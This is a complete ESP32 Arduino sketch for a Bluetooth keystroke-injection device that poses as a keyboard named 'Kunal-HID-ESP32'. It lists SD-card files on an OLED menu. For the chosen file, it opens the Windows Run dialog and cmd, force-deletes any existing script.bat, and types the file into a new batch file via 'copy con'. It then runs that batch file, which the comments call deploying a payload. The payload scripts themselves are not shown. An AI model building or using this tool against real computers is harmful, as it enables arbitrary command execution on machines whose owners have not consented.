#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SPI.h>
#include <SD.h>
#include <vector>
#include <BleKeyboard.h> 

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// Initialize BLE Keyboard as Kunal's device
BleKeyboard bleKeyboard("Kunal-HID-ESP32", "SBJITMR", 100);

// Pin Definitions based on your provided setup
const int chipSelect = 5;
const int BTN_UP = 12;
const int BTN_DOWN = 14;
const int BTN_SELECT = 27;

// Menu and State Variables
std::vector<String> fileNames;
int selectedIndex = 0;
int scrollOffset = 0; 
bool lastUpState = HIGH;
bool lastDownState = HIGH;
bool lastSelectState = HIGH;

void setup() {
  Serial.begin(115200);
  
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);

  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    for(;;); 
  }

  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(0, 10);
  display.println("Initializing...");
  display.display();

  bleKeyboard.begin();

  if (!SD.begin(chipSelect)) {
    showError("SD Init Failed!");
    return;
  }

  updateFileList();
}

void loop() {
  handleMenu();
}

void updateFileList() {
  fileNames.clear();
  File root = SD.open("/");
  while (File entry = root.openNextFile()) {
    if (!entry.isDirectory()) {
      fileNames.push_back(String(entry.name()));
    }
    entry.close();
  }
  root.close();
}

void handleMenu() {
  display.clearDisplay();
  display.setCursor(0, 0);
  
  if(bleKeyboard.isConnected()) {
    display.print("BLE: CONNECTED");
  } else {
    display.print("BLE: DISCONNECTED");
  }
  display.drawLine(0, 10, 128, 10, WHITE);

  // Scroll Window Logic for long file lists
  if (selectedIndex < scrollOffset) scrollOffset = selectedIndex;
  if (selectedIndex >= scrollOffset + 5) scrollOffset = selectedIndex - 4;

  for (int i = 0; i < 5; i++) {
    int fileIdx = i + scrollOffset;
    if (fileIdx >= fileNames.size()) break;

    display.setCursor(0, 15 + (i * 10));
    if (fileIdx == selectedIndex) {
      display.print("> ");
    } else {
      display.print("  ");
    }
    display.println(fileNames[fileIdx]);
  }
  display.display();

  checkButtons();
}

void checkButtons() {
  bool currentUp = digitalRead(BTN_UP);
  bool currentDown = digitalRead(BTN_DOWN);
  bool currentSelect = digitalRead(BTN_SELECT);

  if (currentUp == LOW && lastUpState == HIGH) {
    selectedIndex--;
    if (selectedIndex < 0) selectedIndex = fileNames.size() - 1;
    delay(50); 
  }
  lastUpState = currentUp;

  if (currentDown == LOW && lastDownState == HIGH) {
    selectedIndex++;
    if (selectedIndex >= fileNames.size()) selectedIndex = 0;
    delay(50);
  }
  lastDownState = currentDown;

  if (currentSelect == LOW && lastSelectState == HIGH) {
    if (fileNames.size() > 0) {
      executeHIDPayload(fileNames[selectedIndex]);
    }
    delay(50);
  }
  lastSelectState = currentSelect;
}

void executeHIDPayload(String fileName) {
  if (!bleKeyboard.isConnected()) {
    showError("Connect BLE!");
    return;
  }

  File myFile = SD.open("/" + fileName);
  if (myFile) {
    display.clearDisplay();
    display.setCursor(0, 20);
    display.println("DEPLOYING:");
    display.println(fileName);
    display.display();

    delay(500); 

    // Step 1: Open Run Dialog
    bleKeyboard.press(KEY_LEFT_GUI);
    bleKeyboard.press('r');
    delay(400); 
    bleKeyboard.releaseAll();
    delay(600);
    
    // Step 2: Open Command Prompt
    bleKeyboard.print("cmd");
    bleKeyboard.write(KEY_RETURN);
    delay(1000); 

    // Step 3: THE CLEANER - Delete existing script to avoid "Overwrite?" prompts
    bleKeyboard.print("del /f /q script.bat >nul 2>&1"); 
    bleKeyboard.write(KEY_RETURN);
    delay(300);

    // Step 4: THE WRITER - Start fresh Copy Con
    bleKeyboard.print("copy con script.bat");
    bleKeyboard.write(KEY_RETURN);
    delay(600); 

    // Step 5: Character Transmission from SD to HID
    while (myFile.available()) {
      char c = myFile.read();
      bleKeyboard.write(c);
      delay(25); // Safe delay for Windows keyboard buffer
    }
    myFile.close();

    // Step 6: Save (Ctrl+Z)
    delay(500);
    bleKeyboard.press(KEY_LEFT_CTRL);
    bleKeyboard.press('z'); 
    bleKeyboard.releaseAll();
    bleKeyboard.write(KEY_RETURN);
    delay(800); 
    
    // Step 7: Execute the payload
    bleKeyboard.print("script.bat");
    bleKeyboard.write(KEY_RETURN);

    display.println("PAYLOAD SENT!");
    display.display();
    delay(2000);
  }
}

void showError(String msg) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 30);
  display.println(msg);
  display.display();
}